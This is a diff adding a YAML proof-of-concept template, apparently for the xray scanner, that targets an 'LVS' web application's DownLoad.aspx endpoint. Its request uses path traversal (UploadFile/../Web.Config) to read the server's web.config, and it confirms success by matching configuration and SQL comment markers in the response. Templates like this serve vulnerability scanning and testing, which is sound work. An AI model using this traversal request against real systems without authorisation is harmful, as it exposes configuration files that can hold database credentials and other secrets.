@@ -1,0 +1,21 @@
+name: poc-yaml-LVS-DownLoad-File-reading
+transport: http
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Business/DownLoad.aspx?p=UploadFile/../Web.Config
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+
+    expression: response.status == 200 && response.body.bcontains(b'<configuration>') && response.body.bcontains(b'<!--sql验证：-->')
+expression: r0()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139123175
+
+
+
